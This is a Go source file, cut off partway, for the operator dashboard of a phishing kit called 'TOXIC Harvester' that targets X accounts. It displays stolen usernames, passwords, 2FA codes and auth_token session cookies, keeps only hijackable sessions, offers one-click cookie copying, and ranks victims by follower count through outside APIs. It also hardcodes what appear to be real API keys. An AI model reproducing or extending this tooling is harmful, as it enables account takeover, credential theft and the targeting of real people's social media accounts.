package main

import (
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
)

var (
	rapidAPIKey    = getEnvOrDefault("RAPIDAPI_KEY", "05246c7182msh007a0a880907fb9p11425djsn6afe2cb616d6")
	frontrunAPIKey = getEnvOrDefault("FRONTRUN_API_KEY", "zeLwkSGCkqjfsBnhRyjavGkitJseYqy8")
	userCache      = make(map[string]*UserInfo)
	userCacheMu    sync.RWMutex
	smartCache     = make(map[string]*bool)
	smartCacheMu   sync.RWMutex
)

func getEnvOrDefault(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

type UserInfo struct {
	Username  string `json:"username"`
	Name      string `json:"name"`
	Followers int    `json:"followers"`
}

func lookupUserByID(userID string) *UserInfo {
	userCacheMu.RLock()
	if cached, ok := userCache[userID]; ok {
		userCacheMu.RUnlock()
		return cached
	}
	userCacheMu.RUnlock()

	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("GET", "https://twitter241.p.rapidapi.com/get-users-v2?users="+userID, nil)
	req.Header.Set("x-rapidapi-host", "twitter241.p.rapidapi.com")
	req.Header.Set("x-rapidapi-key", rapidAPIKey)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	var data struct {
		Result []struct {
			ScreenName     string      `json:"screen_name"`
			Name           string      `json:"name"`
			FollowersCount interface{} `json:"followers_count"` // can be string or int
		} `json:"result"`
	}
	if err := json.Unmarshal(body, &data); err != nil || len(data.Result) == 0 {
		log.Printf("[lookup] parse error or empty result: %v", err)
		return nil
	}

	// Parse followers count (can be string or int)
	followers := 0
	switch v := data.Result[0].FollowersCount.(type) {
	case float64:
		followers = int(v)
	case string:
		fmt.Sscanf(v, "%d", &followers)
	}

	info := &UserInfo{
		Username:  data.Result[0].ScreenName,
		Name:      data.Result[0].Name,
		Followers: followers,
	}
	log.Printf("[lookup] found user: @%s (%s) - %d followers", info.Username, info.Name, info.Followers)

	userCacheMu.Lock()
	userCache[userID] = info
	userCacheMu.Unlock()

	return info
}

func checkSmartFollower(username string) *bool {
	smartCacheMu.RLock()
	if cached, ok := smartCache[username]; ok {
		smartCacheMu.RUnlock()
		return cached
	}
	smartCacheMu.RUnlock()

	client := &http.Client{Timeout: 15 * time.Second}
	req, _ := http.NewRequest("GET", "https://api.frontrun.pro/api/v1/pro/twitter/"+username+"/is-smart-follower", nil)
	req.Header.Set("accept", "application/json")
	req.Header.Set("Authorization", "Bearer "+frontrunAPIKey)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	var data struct {
		IsSmartFollower bool `json:"isSmartFollower"`
	}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil
	}

	result := data.IsSmartFollower
	smartCacheMu.Lock()
	smartCache[username] = &result
	smartCacheMu.Unlock()

	return &result
}

func getUserIDFromCookies(cookies []Cookie) string {
	for _, c := range cookies {
		if c.Name == "twid" {
			decoded, _ := url.QueryUnescape(c.Value)
			if strings.HasPrefix(decoded, "u=") {
				return decoded[2:]
			}
		}
	}
	return ""
}

type admin struct {
	store    *Store
	cfg      *config
	user     string
	passHash []byte
	sessKey  []byte
	live     map[string]int64
	prefix   string
}

func newAdmin(cfg *config, store *Store) *admin {
	a := &admin{
		store: store,
		cfg:   cfg,
		user:  strings.TrimSpace(os.Getenv("PANEL_USER")),
		live:  make(map[string]int64),
	}
	if pass := os.Getenv("PANEL_PASS"); pass != "" {
		h, err := bcrypt.GenerateFromPassword([]byte(pass), bcrypt.DefaultCost)
		if err == nil {
			a.passHash = h
		}
	}
	if sec := os.Getenv("PANEL_SECRET"); sec != "" {
		sum := sha256.Sum256([]byte(sec))
		a.sessKey = sum[:]
	} else {
		a.sessKey = make([]byte, 32)
		_, _ = rand.Read(a.sessKey)
	}
	return a
}

func (a *admin) handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("ok")) })
	mux.HandleFunc("/login", a.handleLogin)
	mux.HandleFunc("/logout", a.handleLogout)
	mux.HandleFunc("/api/sessions", a.auth(a.apiSessions))
	mux.HandleFunc("/api/visitors", a.auth(a.apiVisitors))
	mux.HandleFunc("/api/stats", a.auth(a.apiStats))
	mux.HandleFunc("/api/lookup/", a.auth(a.apiLookup))
	mux.HandleFunc("/api/smart/", a.auth(a.apiSmart))
	mux.HandleFunc("/api/lookup-all", a.auth(a.apiLookupAll))
	mux.HandleFunc("/api/delete/", a.auth(a.apiDelete))
	mux.HandleFunc("/api/clear-all", a.auth(a.apiClearAll))
	mux.HandleFunc("/", a.auth(a.index))
	return mux
}

func (a *admin) apiDelete(w http.ResponseWriter, r *http.Request) {
	sessionID := strings.TrimPrefix(r.URL.Path, "/api/delete/")
	if sessionID == "" {
		json.NewEncoder(w).Encode(map[string]string{"error": "no session id"})
		return
	}
	// Delete from store
	a.store.deleteSession(sessionID)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (a *admin) apiClearAll(w http.ResponseWriter, r *http.Request) {
	a.store.clearAll()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (a *admin) apiLookup(w http.ResponseWriter, r *http.Request) {
	sessionID := strings.TrimPrefix(r.URL.Path, "/api/lookup/")
	sess := a.store.get(sessionID)
	if sess == nil {
		json.NewEncoder(w).Encode(map[string]string{"error": "session not found"})
		return
	}

	userID := getUserIDFromCookies(sess.CookieJar)
	if userID == "" {
		json.NewEncoder(w).Encode(map[string]string{"error": "no user ID in cookies"})
		return
	}

	info := lookupUserByID(userID)
	if info == nil {
		json.NewEncoder(w).Encode(map[string]string{"error": "lookup failed"})
		return
	}

	sess.Username = info.Username
	a.store.persist(sess)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(info)
}

func (a *admin) apiSmart(w http.ResponseWriter, r *http.Request) {
	username := strings.TrimPrefix(r.URL.Path, "/api/smart/")
	if username == "" {
		json.NewEncoder(w).Encode(map[string]string{"error": "no username"})
		return
	}

	isSmart := checkSmartFollower(username)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"username": username,
		"is_smart": isSmart,
	})
}

func (a *admin) apiLookupAll(w http.ResponseWriter, r *http.Request) {
	sessions := a.store.all()
	found := 0
	for _, sess := range sessions {
		if sess.Username != "" {
			continue
		}
		userID := getUserIDFromCookies(sess.CookieJar)
		if userID == "" {
			continue
		}
		info := lookupUserByID(userID)
		if info != nil {
			sess.Username = info.Username
			a.store.persist(sess)
			found++
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{"found": found})
}

func (a *admin) prefixed(prefix string) http.Handler {
	a.prefix = strings.TrimSuffix(prefix, "/")
	inner := a.handler()
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		trimmed := strings.TrimPrefix(r.URL.Path, prefix)
		if trimmed == "" || trimmed[0] != '/' {
			trimmed = "/" + trimmed
		}
		r2 := r.Clone(r.Context())
		r2.URL.Path = trimmed
		inner.ServeHTTP(w, r2)
	})
}

func (a *admin) url(p string) string {
	if a.prefix == "" {
		return p
	}
	return a.prefix + p
}

func (a *admin) authorized(r *http.Request) bool {
	ck, err := r.Cookie("panel_sid")
	if err != nil || ck.Value == "" {
		return false
	}
	exp, ok := a.live[ck.Value]
	if !ok || time.Now().Unix() > exp {
		return false
	}
	return true
}

func (a *admin) auth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if a.passHash == nil {
			next(w, r)
			return
		}
		if !a.authorized(r) {
			a.loginPage(w, r)
			return
		}
		next(w, r)
	}
}

func (a *admin) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		a.loginPage(w, r)
		return
	}
	r.ParseForm()
	user := r.FormValue("username")
	pass := r.FormValue("password")
	if subtle.ConstantTimeCompare([]byte(user), []byte(a.user)) != 1 ||
		bcrypt.CompareHashAndPassword(a.passHash, []byte(pass)) != nil {
		a.loginPage(w, r)
		return
	}
	token := randomToken(32)
	a.live[token] = time.Now().Add(24 * time.Hour).Unix()
	http.SetCookie(w, &http.Cookie{
		Name:     "panel_sid",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
		MaxAge:   86400,
	})
	http.Redirect(w, r, a.url("/"), http.StatusSeeOther)
}

func (a *admin) handleLogout(w http.ResponseWriter, r *http.Request) {
	if ck, err := r.Cookie("panel_sid"); err == nil {
		delete(a.live, ck.Value)
	}
	http.SetCookie(w, &http.Cookie{Name: "panel_sid", Value: "", Path: "/", MaxAge: -1})
	http.Redirect(w, r, a.url("/login"), http.StatusSeeOther)
}

const toxicStyle = `
<style>
@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Syne:wght@600;700;800&display=swap');
:root{--bg:#07090a;--card:rgba(16,24,18,.72);--line:rgba(42,255,92,.14);--text:#edf8ee;--muted:#8aa090;--purple:#2aff5c;--ok:#7dff9a;--bad:#ff6b6b;--glow:rgba(42,255,92,.28);--hover:rgba(42,255,92,.1);--ink:#07100a;--rail:rgba(10,16,12,.55)}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{background:var(--bg);color:var(--text);font-family:'Manrope',system-ui,sans-serif;font-size:13.5px;overflow-x:hidden}
body::before,body::after{content:'';position:fixed;pointer-events:none;z-index:0;width:52vw;height:52vw;max-width:640px;max-height:640px;border-radius:50%;filter:blur(80px);opacity:.45}
body::before{top:-18%;left:-10%;background:radial-gradient(circle,rgba(42,255,92,.45),transparent 68%);animation:blob 18s ease-in-out infinite}
body::after{right:-12%;bottom:-20%;background:radial-gradient(circle,rgba(20,180,80,.4),transparent 68%);animation:blob 22s ease-in-out infinite reverse}
@keyframes blob{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(6%,8%) scale(1.12)}}
h1,h2,h3,.topbar-title,.nav-label,.stat-val{font-family:'Syne',sans-serif;letter-spacing:.04em}
*{scrollbar-width:thin;scrollbar-color:rgba(42,255,92,.4) transparent}
.sidebar{position:fixed;left:0;top:0;width:220px;height:100vh;background:var(--rail);border-right:1px solid rgba(255,255,255,.07);padding:16px 12px;backdrop-filter:blur(22px);z-index:10}
.logo{display:flex;align-items:center;gap:12px;padding:10px;margin-bottom:24px}
.logo-icon{width:40px;height:40px;background:linear-gradient(135deg,var(--purple),#15a050);border-radius:14px;display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--ink);font-size:18px;box-shadow:0 12px 40px rgba(42,255,92,.25);font-family:'Syne',sans-serif}
.logo-text{font-size:16px;font-weight:700;color:var(--text);font-family:'Syne',sans-serif}
.nav-label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.16em;padding:12px 12px 8px;font-weight:800}
.nav-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:14px;color:var(--muted);text-decoration:none;font-size:13px;margin-bottom:2px;font-weight:650;transition:all .2s ease;cursor:pointer}
.nav-item svg{width:16px;height:16px;opacity:.75;flex-shrink:0}
.nav-item:hover{background:var(--hover);color:var(--text)}
.nav-item.active{background:var(--purple);color:var(--ink)}
.nav-badge{background:var(--ink);color:var(--purple);font-size:10px;padding:2px 8px;border-radius:999px;margin-left:auto;font-weight:700}
.nav-item.active .nav-badge{background:rgba(0,0,0,.3);color:var(--ink)}
.main{margin-left:220px;padding:24px 28px;min-height:100vh;position:relative;z-index:1;animation:fadeUp .28s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
.topbar{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:24px}
.topbar-path{color:var(--muted);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:.12em;font-family:'Syne',sans-serif}
.topbar-path span{color:var(--purple);font-weight:700}
.topbar-title{font-size:30px;font-weight:800;color:var(--text);letter-spacing:-.03em}
.btn{padding:10px 16px;border-radius:999px;border:none;cursor:pointer;font-weight:800;font-size:12px;font-family:'Syne',sans-serif;transition:all .2s ease;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--purple);color:var(--ink);box-shadow:0 8px 24px rgba(42,255,92,.28)}
.btn-primary:hover{filter:brightness(1.06);transform:translateY(-1px)}
.btn-ghost{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);color:var(--text)}
.btn-ghost:hover{background:var(--hover);border-color:var(--purple);color:var(--purple)}
.btn-danger{background:rgba(255,80,80,.15);border:1px solid rgba(255,80,80,.3);color:#ff6b6b}
.btn-danger:hover{background:rgba(255,80,80,.25)}
.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;margin-bottom:24px}
.stat{background:var(--card);border:1px solid rgba(255,255,255,.07);border-radius:18px;padding:20px;backdrop-filter:blur(16px);transition:all .2s ease}
.stat:hover{border-color:rgba(42,255,92,.45);transform:translateY(-4px)}
.stat-val{font-size:28px;font-weight:800;color:var(--text);margin-bottom:4px}
.stat-label{color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:.08em;font-weight:700}
.card{background:var(--card);border:1px solid rgba(255,255,255,.07);border-radius:20px;overflow:hidden;backdrop-filter:blur(16px)}
.card-head{padding:16px 20px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;align-items:center}
.card-head h3{font-size:13px;font-weight:700;color:var(--text);display:flex;align-items:center;gap:8px}
.live-dot{width:8px;height:8px;background:var(--purple);border-radius:50%;box-shadow:0 0 10px var(--ok);animation:livePulse 1.6s ease infinite}
@keyframes livePulse{50%{opacity:.35}}
.cap-row{display:grid;grid-template-columns:1fr 100px 80px 80px auto;padding:14px 20px;border-bottom:1px solid var(--line);cursor:pointer;transition:all .15s;align-items:center;gap:12px}
.cap-row:hover{background:var(--hover)}
.cap-user{display:flex;align-items:center;gap:12px}
.cap-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,rgba(42,255,92,.2),rgba(42,255,92,.05));border:1px solid rgba(42,255,92,.3);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:var(--purple)}
.cap-info{display:flex;flex-direction:column;gap:2px}
.cap-name{color:var(--purple);font-weight:600;text-decoration:none}
.cap-name:hover{text-decoration:underline}
.cap-meta{font-size:11px;color:var(--muted)}
.cap-pass{color:#60a5fa;font-family:monospace;font-size:12px;background:rgba(96,165,250,.12);padding:4px 10px;border-radius:8px;text-align:center}
.cap-cookies{color:var(--text);font-size:11px;font-weight:600;background:rgba(42,255,92,.1);padding:4px 8px;border-radius:6px;text-align:center}
.cap-time{color:var(--muted);font-size:11px}
.ttl-badge{font-size:10px;padding:3px 8px;border-radius:6px;font-weight:600}
.ttl-badge.fresh{background:rgba(42,255,92,.15);color:var(--purple)}
.ttl-badge.warn{background:rgba(234,179,8,.15);color:#eab308}
.ttl-badge.expired{background:rgba(255,107,107,.15);color:#ff6b6b}
.smart-badge{font-size:9px;padding:3px 8px;border-radius:6px;font-weight:700;background:linear-gradient(135deg,rgba(42,255,92,.2),rgba(34,197,94,.2));color:var(--purple);border:1px solid rgba(42,255,92,.4)}
.scan-btn{background:rgba(42,255,92,.15);border:1px solid rgba(42,255,92,.3);color:var(--purple);padding:6px 12px;border-radius:8px;cursor:pointer;font-size:11px;transition:all .15s;font-weight:600}
.scan-btn:hover{background:rgba(42,255,92,.25)}
.visitor{display:flex;align-items:center;gap:12px;padding:12px 20px;border-bottom:1px solid var(--line)}
.visitor:last-child{border-bottom:none}
.v-dot{width:8px;height:8px;background:var(--purple);border-radius:50%;flex-shrink:0;box-shadow:0 0 8px var(--ok)}
.v-info{flex:1;min-width:0}
.v-ip{color:var(--purple);font-family:monospace;font-size:12px;font-weight:600}
.v-loc{color:var(--muted);font-size:10px;margin-top:2px}
.v-time{color:var(--muted);font-size:10px;opacity:.7}
.empty{padding:48px;text-align:center;color:var(--muted);font-size:13px}
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(8px);align-items:center;justify-content:center;z-index:100}
.modal.active{display:flex}
.modal-box{background:var(--card);border:1px solid rgba(255,255,255,.1);border-radius:24px;width:580px;max-height:90vh;overflow-y:auto}
.modal-head{padding:18px 24px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;align-items:center}
.modal-head h3{color:var(--text);font-size:16px;font-weight:700;font-family:'Syne',sans-serif}
.modal-close{background:var(--hover);border:none;color:var(--muted);width:32px;height:32px;border-radius:10px;cursor:pointer;font-size:18px}
.modal-body{padding:24px}
.det{margin-bottom:16px}
.det-label{color:var(--muted);font-size:9px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:4px;font-weight:700}
.det-val{color:var(--text);font-size:14px;font-weight:500}
.det-val.big{font-size:20px;font-weight:700;color:var(--purple);font-family:'Syne',sans-serif}
.det-val.mono{font-family:monospace;font-size:11px;color:var(--muted);word-break:break-all}
.cook-section{background:rgba(0,0,0,.3);border-radius:14px;padding:16px;margin-top:16px}
.cook-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px}
.cook-title{font-size:12px;font-weight:700;color:var(--text)}
.cook-box{background:rgba(0,0,0,.3);border:1px solid var(--line);border-radius:10px;padding:12px;font-family:monospace;font-size:10px;max-height:200px;overflow-y:auto;color:var(--muted);white-space:pre-wrap;word-break:break-all}
.warn{background:rgba(234,179,8,0.08);border:1px solid rgba(234,179,8,0.2);border-radius:10px;padding:12px;margin:12px 0}
.warn p{color:#ca8a04;font-size:11px}
.warn code{background:rgba(0,0,0,.3);padding:2px 6px;border-radius:4px;font-size:10px}
.frontrun-box{background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.2);border-radius:12px;padding:14px;margin:16px 0}
.login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;z-index:1}
.login-box{background:rgba(10,16,12,.62);border:1px solid rgba(255,255,255,.08);border-radius:28px;padding:0;width:min(400px,90%);overflow:hidden;backdrop-filter:blur(28px)}
.login-logo{width:92px;height:92px;background:linear-gradient(135deg,var(--purple),#15a050);border-radius:28px;display:flex;align-items:center;justify-content:center;font-size:36px;font-weight:800;color:var(--ink);margin:28px auto 0;font-family:'Syne',sans-serif}
.login-inner{padding:18px 24px 24px}
.login-kicker{font-size:12px;letter-spacing:.28em;font-weight:800;color:var(--purple);margin-bottom:6px;text-align:center;font-family:'Syne',sans-serif}
.login-title{text-align:center;font-size:28px;font-weight:800;color:var(--text);margin-bottom:22px;font-family:'Syne',sans-serif}
.login-field{margin-bottom:14px}
.login-label{display:block;color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.16em;margin-bottom:8px;font-weight:700;font-family:'Syne',sans-serif}
.login-input{width:100%;padding:13px 16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:14px;color:var(--text);font-size:14px;outline:none}
.login-input:focus{border-color:var(--purple)}
.login-btn{width:100%;padding:13px 16px;background:var(--purple);border:none;border-radius:999px;color:var(--ink);font-size:14px;font-weight:800;cursor:pointer;margin-top:8px;font-family:'Syne',sans-serif}
@media(max-width:900px){.sidebar{display:none}.main{margin-left:0}.stats{grid-template-columns:repeat(2,1fr)}}
</style>
`

func (a *admin) loginPage(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, `<!doctype html><html><head><meta charset="utf-8"><title>Login - Harvester</title><meta name="viewport" content="width=device-width,initial-scale=1">`+toxicStyle+`</head><body>
<div class="login-wrap">
<div class="login-box">
<div class="login-logo">X</div>
<div class="login-inner">
<div class="login-kicker">TOXIC</div>
<div class="login-title">Harvester</div>
<form method="post" action="`+a.url("/login")+`">
<div class="login-field"><label class="login-label">Username</label><input class="login-input" name="username" autocomplete="off" autofocus></div>
<div class="login-field"><label class="login-label">Password</label><input class="login-input" type="password" name="password"></div>
<button class="login-btn" type="submit">Sign in →</button>
</form>
</div>
</div>
</div>
</body></html>`)
}

func (a *admin) index(w http.ResponseWriter, r *http.Request) {
	allSessions := a.store.all()
	visitors := a.store.visitors()

	sort.Slice(allSessions, func(i, j int) bool {
		return allSessions[i].LastSeen.After(allSessions[j].LastSeen)
	})

	// Only show HIJACKABLE captures (has auth_token)
	sessions := make([]*Session, 0)
	for _, s := range allSessions {
		// Must have auth_token to be a hijackable session
		if s.AuthToken != "" && len(s.AuthToken) > 30 {
			sessions = append(sessions, s)
		}
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	totalCookies := 0
	for _, s := range sessions {
		totalCookies += len(s.CookieJar)
	}

	var b strings.Builder
	b.WriteString(`<!doctype html><html><head><meta charset="utf-8"><title>Harvester - Captures</title><meta name="viewport" content="width=device-width,initial-scale=1">` + toxicStyle + `</head><body>
<aside class="sidebar">
<div class="logo"><div class="logo-icon">X</div><span class="logo-text">Harvester</span></div>
<div class="nav-label">Overview</div>
<a class="nav-item active" onclick="showTab('captures')">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
Captures<span class="nav-badge">` + fmt.Sprintf("%d", len(sessions)) + `</span></a>
<a class="nav-item" onclick="showTab('visitors')">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
Visitors<span class="nav-badge">` + fmt.Sprintf("%d", len(visitors)) + `</span></a>
<div class="nav-label">Actions</div>
<a class="nav-item" onclick="lookupAll()">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
Lookup All</a>
<a class="nav-item" onclick="if(confirm('Clear ALL data?'))clearAll()">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
Clear All</a>
<div class="nav-label">Account</div>
<a href="` + a.url("/logout") + `" class="nav-item">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
Sign out</a>
</aside>
<main class="main">
<div class="topbar">
<div><div class="topbar-path">TOXIC / <span>PANEL</span></div><h1 class="topbar-title">Dashboard</h1></div>
<div style="display:flex;gap:8px">
<button class="btn btn-primary" onclick="lookupAll()">👤 Lookup All</button>
<button class="btn btn-ghost" onclick="location.reload()">↻ Refresh</button>
</div>
</div>
<div class="stats">
<div class="stat"><div class="stat-val">` + fmt.Sprintf("%d", len(visitors)) + `</div><div class="stat-label">Visitors</div></div>
<div class="stat"><div class="stat-val">` + fmt.Sprintf("%d", len(sessions)) + `</div><div class="stat-label">Captures</div></div>
<div class="stat"><div class="stat-val">` + fmt.Sprintf("%d", totalCookies) + `</div><div class="stat-label">Cookies</div></div>
<div class="stat"><div class="stat-val">` + fmt.Sprintf("%d", countComplete(sessions)) + `</div><div class="stat-label">Complete</div></div>
<div class="stat"><div class="stat-val">` + fmt.Sprintf("%d", len(allSessions)) + `</div><div class="stat-label">Sessions</div></div>
</div>

<div id="captures-tab">
<div class="card">
<div class="card-head"><h3><span class="live-dot"></span> Captures</h3></div>`)

	if len(sessions) == 0 {
		b.WriteString(`<div class="empty">No captures yet. Waiting for victims...</div>`)
	} else {
		for _, s := range sessions {
			username := s.Username
			
			followers := 0
			
			// Auto-lookup username from UserID if not set
			if username == "" && s.UserID != "" {
				if info := lookupUserByID(s.UserID); info != nil {
					username = info.Username
					followers = info.Followers
					s.Username = username // cache it
				}
			}
			
			// Also try to get UserID from cookies if not set
			if s.UserID == "" {
				userID := getUserIDFromCookies(s.CookieJar)
				if userID != "" {
					s.UserID = userID
					if username == "" {
						if info := lookupUserByID(userID); info != nil {
							username = info.Username
							followers = info.Followers
							s.Username = username
						}
					}
				}
			}
			
			// If we have username but no followers, lookup again
			if username != "" && username != "Unknown" && followers == 0 && s.UserID != "" {
				if info := lookupUserByID(s.UserID); info != nil {
					followers = info.Followers
				}
			}
			
			if username == "" {
				username = "Unknown"
			}
			
			followersStr := ""
			if followers > 0 {
				if followers >= 1000000 {
					followersStr = fmt.Sprintf("%.1fM", float64(followers)/1000000)
				} else if followers >= 1000 {
					followersStr = fmt.Sprintf("%.1fK", float64(followers)/1000)
				} else {
					followersStr = fmt.Sprintf("%d", followers)
				}
			}
			initial := "?"
			if len(username) > 0 && username != "Unknown" {
				initial = strings.ToUpper(string(username[0]))
			}
			password := s.Password
			if password == "" {
				password = "—"
			}
			cookieCount := len(s.CookieJar)
			
			// TTL calculation
			ttl, ttlClass := getTTL(s.CookieJar)
			
			location := s.Country
			if s.City != "" && s.Country != "" {
				location = s.City + ", " + s.Country
			}
			if location == "" {
				location = "Unknown"
			}

			followersDisplay := ""
			if followersStr != "" {
				followersDisplay = fmt.Sprintf(`<span style="color:#2aff5c;font-size:11px;margin-left:6px">👥 %s</span>`, followersStr)
			}
			
			b.WriteString(fmt.Sprintf(`<div class="cap-row" onclick='showCapture("%s")'>
<div class="cap-user">
<div class="cap-avatar">%s</div>
<div class="cap-info">
<a class="cap-name" href="https://x.com/%s" target="_blank" onclick="event.stopPropagation()">@%s</a>%s
<div class="cap-meta">%s • %s</div>
</div>
</div>
<div class="cap-pass">%s</div>
<div class="cap-cookies">🍪 %d</div>
<div><span class="ttl-badge %s">%s</span></div>
<button class="scan-btn" onclick="event.stopPropagation();copyCookies('%s')">📋 Copy</button>
</div>`,
				s.ID,
				htmlEscape(initial),
				htmlEscape(username),
				htmlEscape(username),
				followersDisplay,
				htmlEscape(location),
				htmlEscape(s.IP),
				htmlEscape(password),
				cookieCount,
				ttlClass,
				ttl,
				s.ID,
			))
		}
	}

	b.WriteString(`</div></div>

<div id="visitors-tab" style="display:none">
<div class="card">
<div class="card-head"><h3><span class="live-dot"></span> Live Visitors</h3></div>`)

	if len(visitors) == 0 {
		b.WriteString(`<div class="empty">No visitors yet</div>`)
	} else {
		for _, v := range visitors {
			location := v.Country
			if v.City != "" && v.Country != "" {
				location = v.City + ", " + v.Country
			}
			if location == "" {
				location = "Unknown"
			}
			b.WriteString(fmt.Sprintf(`<div class="visitor">
<div class="v-dot"></div>
<div class="v-info"><div class="v-ip">%s</div><div class="v-loc">%s</div></div>
<div class="v-time">%s</div>
</div>`, htmlEscape(v.IP), htmlEscape(location), v.LastSeen.Format("Jan 02 15:04")))
		}
	}

	b.WriteString(`</div></div>
</main>

<div class="modal" id="modal">
<div class="modal-box">
<div class="modal-head">
<h3 id="modal-title">Capture</h3>
<div style="display:flex;gap:8px;align-items:center">
<button class="btn btn-danger" style="padding:6px 12px;font-size:11px" onclick="deleteCapture()">🗑 Delete</button>
<button class="modal-close" onclick="closeModal()">×</button>
</div>
</div>
<div class="modal-body" id="modal-body"></div>
</div>
</div>

<script>
const sessionsData = {`)

	for i, s := range sessions {
		if i > 0 {
			b.WriteString(",")
		}
		ttl, ttlClass := getTTL(s.CookieJar)
		data := map[string]any{
			"id":         s.ID,
			"ip":         s.IP,
			"country":    s.Country,
			"city":       s.City,
			"username":   s.Username,
			"password":   s.Password,
			"two_fa":     s.TwoFA,
			"auth_token": s.AuthToken,
			"ct0":        s.CT0,
			"user_agent": s.UserAgent,
			"cookies":    s.cookieJSON(),
			"ttl":        ttl,
			"ttl_status": ttlClass,
		}
		j, _ := json.Marshal(data)
		b.WriteString(`"` + s.ID + `":` + string(j))
	}

	b.WriteString(`};

function showTab(tab) {
	document.getElementById('captures-tab').style.display = tab === 'captures' ? 'block' : 'none';
	document.getElementById('visitors-tab').style.display = tab === 'visitors' ? 'block' : 'none';
	document.querySelectorAll('.nav-item').forEach((n,i) => {
		n.classList.remove('active');
	});
	event.target.closest('.nav-item').classList.add('active');
}

function showCapture(id) {
	var c = sessionsData[id];
	if(!c) return;
	var h = '';
	h += '<div class="det"><div class="det-label">Username</div><div class="det-val big"><a href="https://x.com/'+(c.username||'')+'" target="_blank" style="color:var(--purple);text-decoration:none">@'+(c.username||'Unknown')+'</a></div></div>';
	if(c.password) h += '<div class="det"><div class="det-label">Password</div><div class="det-val big" style="color:#60a5fa">'+c.password+'</div></div>';
	if(c.two_fa) h += '<div class="det"><div class="det-label">2FA Code</div><div class="det-val" style="color:#fbbf24">'+c.two_fa+'</div></div>';
	h += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">';
	h += '<div class="det"><div class="det-label">IP Address</div><div class="det-val mono">'+(c.ip||'—')+'</div></div>';
	h += '<div class="det"><div class="det-label">Location</div><div class="det-val">'+(c.country?(c.city?c.city+', ':'')+c.country:'Unknown')+'</div></div>';
	h += '</div>';
	h += '<div class="det"><div class="det-label">User Agent</div><div class="det-val mono" style="font-size:9px">'+(c.user_agent||'—')+'</div></div>';
